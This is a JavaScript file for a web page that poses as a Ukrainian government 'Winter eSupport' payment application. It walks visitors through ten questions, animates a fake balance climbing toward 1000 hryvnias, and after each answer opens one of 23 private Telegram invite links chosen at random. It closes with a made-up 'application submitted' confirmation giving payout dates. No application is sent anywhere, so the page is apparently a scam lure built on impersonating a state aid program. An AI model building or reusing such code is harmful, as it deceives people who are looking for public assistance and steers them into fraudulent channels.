// Premium Ukrainian Government Application - Зимова єПідтримка
class PremiumWinterSupportApp {
    constructor() {
        this.currentStep = 1;
        this.balance = 0;
        this.maxSteps = 10;
        this.targetBalance = 1000;
        
        // Enhanced questions with icons
        this.questions = [
            {
                step: 1,
                question: "Ви є громадянином України?",
                options: ["Так, є громадянином", "Так, маю довідку про статус", "Проживаю в Україні"],
                icon: "🇺🇦"
            },
            {
                step: 2,
                question: "Ваш вік?",
                options: ["18-25 років", "26-40 років", "41-60 років", "Понад 60 років"],
                icon: "👥"
            },
            {
                step: 3,
                question: "В якому регіоні ви проживаєте?",
                options: ["Київ та область", "Західна Україна", "Центральна Україна", "Інший регіон"],
                icon: "🏘️"
            },
            {
                step: 4,
                question: "Чи маєте ви картку Національного кешбеку?",
                options: ["Так, маю", "Ні, але планую оформити", "Не знаю що це"],
                icon: "💳"
            },
            {
                step: 5,
                question: "На що плануєте витратити кошти?",
                options: ["Комунальні послуги", "Ліки та медицина", "Транспорт", "Підтримка ЗСУ"],
                icon: "💰"
            },
            {
                step: 6,
                question: "Чи отримували ви раніше державну допомогу?",
                options: ["Так, отримував", "Ні, вперше", "Не пам'ятаю"],
                icon: "📋"
            },
            {
                step: 7,
                question: "Як дізналися про програму?",
                options: ["З новин", "Від друзів", "З соціальних мереж", "З офіційних джерел"],
                icon: "📱"
            },
            {
                step: 8,
                question: "Чи маєте додаткові питання?",
                options: ["Ні, все зрозуміло", "Так, хочу уточнити", "Потрібна консультація"],
                icon: "❓"
            },
            {
                step: 9,
                question: "Підтверджуєте готовність отримати виплату?",
                options: ["Так, підтверджую", "Так, готовий", "Абсолютно готовий"],
                icon: "✅"
            },
            {
                step: 10,
                question: "Оберіть спосіб отримання інформації:",
                options: ["Telegram канал", "SMS повідомлення", "Email розсилка"],
                icon: "📬"
            }
        ];

        // Telegram links for redirection
        this.telegramLinks = [
            "https://t.me/+RMlpigdpE3AyY2Zi",
            "https://t.me/+uQWmv7j7cedhMjMy",
            "https://t.me/+31_XY1Y-aYE4YWIy",
            "https://t.me/+GHYrPA38EOQ3ZmY6",
            "https://t.me/+Rw1BRG90Wks1OTUy",
            "https://t.me/+WQWB7nz7QxI1Y2Uy",
            "https://t.me/+ePe_h6hleHUyMTky",
            "https://t.me/+Tq5RTjWD7vI1MDAy",
            "https://t.me/+XFB6402ui180NTJi",
            "https://t.me/+oTsExadH5jhhMmQy",
            "https://t.me/+mAkqZczkbe9jZmJi",
            "https://t.me/+yBwK54796kRlMzUy",
            "https://t.me/+KLBHBzsVqq1hNTVi",
            "https://t.me/+04x5NI8ivClkNDYy",
            "https://t.me/+tcFm06_lzFo4OTVi",
            "https://t.me/+gvDgZ_hs639hYzIy",
            "https://t.me/+XZ4LZgbfSG4yMGVi",
            "https://t.me/+fZKoU-yC3dpmODBi",
            "https://t.me/+f2ujKCDnDs40YWIy",
            "https://t.me/+RqcMyPvNEuY2ZTEy",
            "https://t.me/+bsxSWyluNhs5ZmIy",
            "https://t.me/+Y6SfnlX_qqM1ZDcy",
            "https://t.me/+cAcqMs1nWL8wODAy"
        ];

        this.init();
    }

    init() {
        this.renderCurrentQuestion();
        this.updateProgress();
        this.updateBalance();
        this.initializeEnhancements();
    }

    initializeEnhancements() {
        // Add premium hover effects
        this.addHoverEffects();
        
        // Initialize particle systems
        this.createHeaderParticles();
        
        // Add smooth scroll behavior
        document.documentElement.style.scrollBehavior = 'smooth';
        
        // Initialize touch gesture support
        this.initTouchGestures();
    }

    renderCurrentQuestion() {
        const currentQuestionData = this.questions[this.currentStep - 1];
        const questionTitle = document.getElementById('questionTitle');
        const questionEmoji = document.getElementById('questionEmoji');
        const optionsContainer = document.getElementById('optionsContainer');
        const currentStepEl = document.getElementById('currentStep');

        // Smooth fade transition
        const formCard = document.querySelector('.form-card');
        formCard.style.opacity = '0';
        formCard.style.transform = 'translateY(20px)';

        setTimeout(() => {
            // Update question content
            questionTitle.textContent = currentQuestionData.question;
            questionEmoji.textContent = currentQuestionData.icon;
            currentStepEl.textContent = `Крок ${this.currentStep}`;

            // Clear and populate options with enhanced styling
            optionsContainer.innerHTML = '';
            currentQuestionData.options.forEach((option, index) => {
                const button = document.createElement('button');
                button.className = 'option-button';
                button.textContent = option;
                
                // Add premium entrance animation
                button.style.opacity = '0';
                button.style.transform = 'translateX(-30px)';
                button.style.transition = 'all 0.4s cubic-bezier(0.4, 0, 0.2, 1)';
                
                // Staggered animation entrance
                setTimeout(() => {
                    button.style.opacity = '1';
                    button.style.transform = 'translateX(0)';
                }, 100 + (index * 100));

                button.addEventListener('click', (e) => this.handleOptionClick(option, e));
                
                // Enhanced hover effects
                button.addEventListener('mouseenter', this.addButtonHoverEffect);
                button.addEventListener('mouseleave', this.removeButtonHoverEffect);
                
                optionsContainer.appendChild(button);
            });

            // Fade in form card
            formCard.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
            formCard.style.opacity = '1';
            formCard.style.transform = 'translateY(0)';
        }, 200);
    }

    handleOptionClick(selectedOption, event) {
        const button = event.target;
        const allButtons = document.querySelectorAll('.option-button');
        
        // Premium selection feedback
        this.playSelectionFeedback(button);
        
        // disable all buttons with smooth transition
        allButtons.forEach(btn => {
            btn.style.pointerEvents = 'none';
            if (btn !== button) {
                btn.style.opacity = '0.4';
                btn.style.transform = 'scale(0.95)';
                btn.style.filter = 'blur(1px)';
            }
        });

        // Highlight selected button with premium animation
        button.classList.add('selected');
        button.style.transform = 'scale(1.02)';
        button.style.boxShadow = '0 12px 40px rgba(0, 87, 183, 0.3)';

        // Animate balance increase
        this.animateBalanceIncrease();

        // Show loading after selection feedback
        setTimeout(() => {
            this.showPremiumLoadingAndRedirect();
        }, 800);
    }

    playSelectionFeedback(button) {
        // Create ripple effect
        const ripple = document.createElement('div');
        ripple.style.position = 'absolute';
        ripple.style.borderRadius = '50%';
        ripple.style.background = 'rgba(0, 87, 183, 0.3)';
        ripple.style.transform = 'scale(0)';
        ripple.style.animation = 'ripple 0.6s linear';
        ripple.style.left = '50%';
        ripple.style.top = '50%';
        ripple.style.width = '20px';
        ripple.style.height = '20px';
        ripple.style.marginLeft = '-10px';
        ripple.style.marginTop = '-10px';
        
        button.style.position = 'relative';
        button.appendChild(ripple);

        // Add ripple animation CSS
        if (!document.getElementById('ripple-styles')) {
            const style = document.createElement('style');
            style.id = 'ripple-styles';
            style.textContent = `
                @keyframes ripple {
                    to {
                        transform: scale(4);
                        opacity: 0;
                    }
                }
            `;
            document.head.appendChild(style);
        }

        setTimeout(() => {
            ripple.remove();
        }, 600);
    }

    animateBalanceIncrease() {
        const increment = 100;
        const startBalance = this.balance;
        const endBalance = this.balance + increment;
        const balanceElement = document.getElementById('balanceAmount');
        const progressElement = document.getElementById('balanceProgress');
        
        // Smooth number animation
        const duration = 800;
        const startTime = performance.now();
        
        const animate = (currentTime) => {
            const elapsed = currentTime - startTime;
            const progress = Math.min(elapsed / duration, 1);
            const easeOutQuart = 1 - Math.pow(1 - progress, 4);
            
            const currentBalance = Math.round(startBalance + (increment * easeOutQuart));
            balanceElement.textContent = currentBalance.toLocaleString();
            
            // Update progress bar
            const progressPercent = (currentBalance / this.targetBalance) * 100;
            progressElement.style.width = `${progressPercent}%`;
            
            if (progress < 1) {
                requestAnimationFrame(animate);
            } else {
                this.balance = endBalance;
                // Add success pulse
                balanceElement.style.animation = 'balancePulse 0.5s ease-out';
                setTimeout(() => {
                    balanceElement.style.animation = '';
                }, 500);
            }
        };
        
        requestAnimationFrame(animate);

        // Add balance pulse animation
        if (!document.getElementById('balance-animations')) {
            const style = document.createElement('style');
            style.id = 'balance-animations';
            style.textContent = `
                @keyframes balancePulse {
                    0%, 100% { transform: scale(1); }
                    50% { transform: scale(1.1); }
                }
            `;
            document.head.appendChild(style);
        }
    }

    showPremiumLoadingAndRedirect() {
        const loadingScreen = document.getElementById('loadingScreen');
        const mainApp = document.getElementById('mainApp');
        
        // Enhanced loading screen entrance
        loadingScreen.classList.remove('hidden');
        loadingScreen.style.opacity = '0';
        loadingScreen.style.transform = 'scale(1.1)';
        
        // Smooth entrance animation
        requestAnimationFrame(() => {
            loadingScreen.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
            loadingScreen.style.opacity = '1';
            loadingScreen.style.transform = 'scale(1)';
        });
        
        mainApp.style.filter = 'blur(5px)';
        mainApp.style.transform = 'scale(0.95)';
        
        // Enhanced loading completion
        setTimeout(() => {
            const randomIndex = Math.floor(Math.random() * this.telegramLinks.length);
            const telegramLink = this.telegramLinks[randomIndex];
            
            // Open Telegram link in new tab
            window.open(telegramLink, '_blank');
            
            // Continue to next step
            if (this.currentStep < this.maxSteps) {
                this.nextStep();
            } else {
                this.completeApplication();
            }
        }, 3500);
    }

    nextStep() {
        this.currentStep++;
        this.updateProgress();
        
        // Smooth loading screen exit
        const loadingScreen = document.getElementById('loadingScreen');
        const mainApp = document.getElementById('mainApp');
        
        loadingScreen.style.opacity = '0';
        loadingScreen.style.transform = 'scale(0.9)';
        
        setTimeout(() => {
            loadingScreen.classList.add('hidden');
            mainApp.style.filter = 'blur(0)';
            mainApp.style.transform = 'scale(1)';
            mainApp.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
        }, 300);
        
        // Render next question with delay for smooth transition
        setTimeout(() => {
            this.renderCurrentQuestion();
        }, 400);
    }

    completeApplication() {
        const loadingScreen = document.getElementById('loadingScreen');
        const mainApp = document.getElementById('mainApp');
        
        // Smooth completion transition
        loadingScreen.style.opacity = '0';
        setTimeout(() => {
            loadingScreen.classList.add('hidden');
            mainApp.style.filter = 'blur(0)';
            mainApp.style.transform = 'scale(1)';
            this.showPremiumCompletionMessage();
        }, 300);
    }

    showPremiumCompletionMessage() {
        const questionForm = document.querySelector('.question-form');
        
        // Create premium completion design
        questionForm.innerHTML = `
            <div class="form-card glassmorphism completion-card">
                <div class="completion-animation">
                    <div class="success-checkmark">
                        <div class="check-icon">
                            <span class="icon-line line-tip"></span>
                            <span class="icon-line line-long"></span>
                            <div class="icon-circle"></div>
                            <div class="icon-fix"></div>
                        </div>
                    </div>
                </div>
                
                <div class="completion-header">
                    <h3>Заяву успішно подано!</h3>
                    <p class="completion-subtitle">Дякуємо за участь в програмі "Зимова єПідтримка"</p>
                </div>
                
                <div class="completion-stats">
                    <div class="stat-item">
                        <div class="stat-icon">💰</div>
                        <div class="stat-content">
                            <div class="stat-label">Сума до отримання</div>
                            <div class="stat-value">1000 ₴</div>
                        </div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-icon">📅</div>
                        <div class="stat-content">
                            <div class="stat-label">Період виплати</div>
                            <div class="stat-value">Грудень 2024 - Лютий 2025</div>
                        </div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-icon">💳</div>
                        <div class="stat-content">
                            <div class="stat-label">Спосіб отримання</div>
                            <div class="stat-value">Національний кешбек</div>
                        </div>
                    </div>
                </div>
                
                <div class="completion-notice glassmorphism">
                    <div class="notice-icon">ℹ️</div>
                    <div class="notice-content">
                        <p>Інформацію про статус виплати ви отримаєте через обраний спосіб зв'язку. Очікувати виплату можна з 1 грудня 2024 року.</p>
                    </div>
                </div>
                
                <div class="completion-actions">
                    <button class="btn btn--primary btn--full-width premium-print-btn" onclick="window.print()">
                        <span class="btn-icon">🖨️</span>
                        <span>Роздрукувати довідку</span>
                    </button>
                </div>
            </div>
        `;

        // Add premium completion styles
        this.addCompletionStyles();
        
        // Trigger entrance animations
        setTimeout(() => {
            document.querySelector('.completion-card').style.opacity = '1';
            document.querySelector('.completion-card').style.transform = 'translateY(0)';
        }, 100);
    }

    addCompletionStyles() {
        const style = document.createElement('style');
        style.id = 'completion-styles';
        style.textContent = `
            .completion-card {
                text-align: center;
                opacity: 0;
                transform: translateY(30px);
                transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
            }
            
            .completion-animation {
                margin-bottom: 32px;
            }
            
            .success-checkmark {
                width: 80px;
                height: 80px;
                border-radius: 50%;
                display: block;
                stroke-width: 2;
                stroke: #28A745;
                stroke-miterlimit: 10;
                margin: 0 auto 20px;
                box-shadow: inset 0px 0px 0px #28A745;
                animation: fill 0.4s ease-in-out 0.4s forwards, scale 0.3s ease-in-out 0.9s both;
                position: relative;
            }
            
            .success-checkmark .check-icon {
                width: 56px;
                height: 56px;
                position: absolute;
                left: 12px;
                top: 12px;
                background: #28A745;
                border-radius: 50%;
            }
            
            .icon-line {
                height: 3px;
                background-color: #fff;
                display: block;
                border-radius: 2px;
                position: absolute;
                z-index: 10;
            }
            
            .icon-line.line-tip {
                top: 25px;
                left: 14px;
                width: 10px;
                transform: rotate(45deg);
                animation: icon-line-tip 0.75s;
            }
            
            .icon-line.line-long {
                top: 21px;
                right: 12px;
                width: 20px;
                transform: rotate(-45deg);
                animation: icon-line-long 0.75s;
            }
            
            .completion-header h3 {
                font-size: 28px;
                color: #28A745;
                margin-bottom: 12px;
                font-weight: 600;
            }
            
            .completion-subtitle {
                font-size: 16px;
                color: #6c757d;
                margin: 0 0 32px 0;
            }
            
            .completion-stats {
                display: grid;
                gap: 16px;
                margin-bottom: 32px;
            }
            
            .stat-item {
                background: rgba(255, 255, 255, 0.6);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.3);
                border-radius: 12px;
                padding: 20px;
                display: flex;
                align-items: center;
                gap: 16px;
                transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            }
            
            .stat-item:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
            }
            
            .stat-icon {
                font-size: 32px;
                flex-shrink: 0;
            }
            
            .stat-content {
                text-align: left;
                flex: 1;
            }
            
            .stat-label {
                font-size: 14px;
                color: #6c757d;
                margin-bottom: 4px;
            }
            
            .stat-value {
                font-size: 18px;
                font-weight: 600;
                color: #0057B7;
            }
            
            .completion-notice {
                border-radius: 12px;
                padding: 20px;
                margin-bottom: 32px;
                display: flex;
                align-items: flex-start;
                gap: 12px;
                text-align: left;
            }
            
            .notice-icon {
                font-size: 20px;
                flex-shrink: 0;
                margin-top: 2px;
            }
            
            .notice-content p {
                margin: 0;
                font-size: 14px;
                color: #1565c0;
                line-height: 1.5;
            }
            
            .premium-print-btn {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 12px;
                font-size: 16px;
                font-weight: 500;
                padding: 16px 24px;
                background: linear-gradient(135deg, #0057B7 0%, #4A90E2 100%);
                border: none;
                border-radius: 12px;
                color: white;
                cursor: pointer;
                transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                position: relative;
                overflow: hidden;
            }
            
            .premium-print-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 12px 30px rgba(0, 87, 183, 0.3);
            }
            
            .premium-print-btn .btn-icon {
                font-size: 18px;
            }
            
            @keyframes fill {
                100% {
                    box-shadow: inset 0px 0px 0px 30px #28A745;
                }
            }
            
            @keyframes scale {
                0%, 100% {
                    transform: none;
                }
                50% {
                    transform: scale3d(1.1, 1.1, 1);
                }
            }
            
            @keyframes icon-line-tip {
                0% {
                    width: 0;
                    left: 1px;
                    top: 19px;
                }
                54% {
                    width: 0;
                    left: 1px;
                    top: 19px;
                }
                70% {
                    width: 10px;
                    left: 14px;
                    top: 25px;
                }
                100% {
                    width: 10px;
                    left: 14px;
                    top: 25px;
                }
            }
            
            @keyframes icon-line-long {
                0% {
                    width: 0;
                    right: 46px;
                    top: 54px;
                }
                65% {
                    width: 0;
                    right: 46px;
                    top: 54px;
                }
                84% {
                    width: 20px;
                    right: 12px;
                    top: 21px;
                }
                100% {
                    width: 20px;
                    right: 12px;
                    top: 21px;
                }
            }
        `;
        document.head.appendChild(style);
    }

    updateProgress() {
        const progressFill = document.getElementById('progressFill');
        const progressPercentage = document.getElementById('progressPercentage');
        const progressPercent = (this.currentStep / this.maxSteps) * 100;
        
        // Smooth progress animation
        progressFill.style.width = `${progressPercent}%`;
        progressPercentage.textContent = `${Math.round(progressPercent)}%`;
    }

    updateBalance() {
        const balanceAmount = document.getElementById('balanceAmount');
        const balanceProgress = document.getElementById('balanceProgress');
        
        balanceAmount.textContent = this.balance.toLocaleString();
        
        const progressPercent = (this.balance / this.targetBalance) * 100;
        balanceProgress.style.width = `${progressPercent}%`;
    }

    addHoverEffects() {
        // Enhanced balance counter hover
        const balanceCounter = document.querySelector('.balance-counter');
        if (balanceCounter) {
            balanceCounter.addEventListener('mouseenter', () => {
                balanceCounter.style.transform = 'scale(1.02) translateY(-2px)';
                balanceCounter.style.boxShadow = '0 16px 40px rgba(255, 255, 255, 0.15)';
            });
            
            balanceCounter.addEventListener('mouseleave', () => {
                balanceCounter.style.transform = 'scale(1) translateY(0)';
                balanceCounter.style.boxShadow = '';
            });
        }

        // Government emblem animation
        const govEmblem = document.querySelector('.gov-emblem');
        if (govEmblem) {
            setInterval(() => {
                govEmblem.style.transform = 'scale(1.05)';
                setTimeout(() => {
                    govEmblem.style.transform = 'scale(1)';
                }, 500);
            }, 4000);
            govEmblem.style.transition = 'transform 0.5s cubic-bezier(0.4, 0, 0.2, 1)';
        }
    }

    addButtonHoverEffect(event) {
        const button = event.target;
        button.style.background = 'rgba(255, 255, 255, 0.95)';
        button.style.borderColor = '#0057B7';
        button.style.transform = 'translateY(-3px) scale(1.01)';
        button.style.boxShadow = '0 12px 30px rgba(0, 87, 183, 0.15)';
    }

    removeButtonHoverEffect(event) {
        const button = event.target;
        if (!button.classList.contains('selected')) {
            button.style.background = 'rgba(255, 255, 255, 0.8)';
            button.style.borderColor = 'rgba(0, 87, 183, 0.2)';
            button.style.transform = 'translateY(0) scale(1)';
            button.style.boxShadow = '';
        }
    }

    createHeaderParticles() {
        const header = document.querySelector('.header');
        if (!header) return;

        // Create floating particles
        for (let i = 0; i < 15; i++) {
            const particle = document.createElement('div');
            particle.className = 'header-particle';
            particle.style.position = 'absolute';
            particle.style.width = `${2 + Math.random() * 3}px`;
            particle.style.height = `${2 + Math.random() * 3}px`;
            particle.style.background = 'rgba(255, 255, 255, 0.4)';
            particle.style.borderRadius = '50%';
            particle.style.pointerEvents = 'none';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.top = Math.random() * 100 + '%';
            particle.style.animation = `particleFloat ${4 + Math.random() * 6}s ease-in-out infinite`;
            particle.style.animationDelay = Math.random() * 3 + 's';
            
            header.appendChild(particle);
        }

        // Add particle animation
        if (!document.getElementById('particle-styles')) {
            const style = document.createElement('style');
            style.id = 'particle-styles';
            style.textContent = `
                @keyframes particleFloat {
                    0%, 100% {
                        transform: translateY(0) translateX(0) scale(1);
                        opacity: 0.4;
                    }
                    25% {
                        transform: translateY(-15px) translateX(10px) scale(1.2);
                        opacity: 0.8;
                    }
                    50% {
                        transform: translateY(-30px) translateX(-10px) scale(0.8);
                        opacity: 1;
                    }
                    75% {
                        transform: translateY(-15px) translateX(5px) scale(1.1);
                        opacity: 0.6;
                    }
                }
                
                .header {
                    position: relative;
                    overflow: hidden;
                }
            `;
            document.head.appendChild(style);
        }
    }

    initTouchGestures() {
        // Add touch gesture support for mobile
        let touchStartX = 0;
        let touchStartY = 0;
        
        document.addEventListener('touchstart', (e) => {
            touchStartX = e.touches[0].clientX;
            touchStartY = e.touches[0].clientY;
        });
        
        document.addEventListener('touchmove', (e) => {
            if (!touchStartX || !touchStartY) return;
            
            let touchEndX = e.touches[0].clientX;
            let touchEndY = e.touches[0].clientY;
            
            let diffX = touchStartX - touchEndX;
            let diffY = touchStartY - touchEndY;
            
            // Prevent default scroll for horizontal swipes
            if (Math.abs(diffX) > Math.abs(diffY)) {
                e.preventDefault();
            }
        });
    }
}

// Initialize the premium application
document.addEventListener('DOMContentLoaded', () => {
    new PremiumWinterSupportApp();
});

// Additional premium enhancements
document.addEventListener('DOMContentLoaded', () => {
    // Add smooth page load animation
    document.body.style.opacity = '0';
    document.body.style.transform = 'translateY(20px)';
    
    setTimeout(() => {
        document.body.style.transition = 'all 0.8s cubic-bezier(0.4, 0, 0.2, 1)';
        document.body.style.opacity = '1';
        document.body.style.transform = 'translateY(0)';
    }, 100);
    
    // Add intersection observer for animations
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);
    
    // Observe elements for scroll animations
    document.querySelectorAll('.info-card, .progress-container, .form-card').forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'all 0.8s cubic-bezier(0.4, 0, 0.2, 1)';
        observer.observe(el);
    });
    
    // Add premium cursor effects
    addPremiumCursorEffects();
});

function addPremiumCursorEffects() {
    const cursor = document.createElement('div');
    cursor.className = 'premium-cursor';
    cursor.style.cssText = `
        position: fixed;
        width: 20px;
        height: 20px;
        background: radial-gradient(circle, rgba(0, 87, 183, 0.3) 0%, transparent 70%);
        border-radius: 50%;
        pointer-events: none;
        z-index: 9999;
        transition: transform 0.1s ease-out;
        display: none;
    `;
    document.body.appendChild(cursor);
    
    // Show cursor only on desktop
    if (window.innerWidth > 768) {
        cursor.style.display = 'block';
        
        document.addEventListener('mousemove', (e) => {
            cursor.style.left = e.clientX - 10 + 'px';
            cursor.style.top = e.clientY - 10 + 'px';
        });
        
        document.addEventListener('mousedown', () => {
            cursor.style.transform = 'scale(0.8)';
        });
        
        document.addEventListener('mouseup', () => {
            cursor.style.transform = 'scale(1)';
        });
    }
}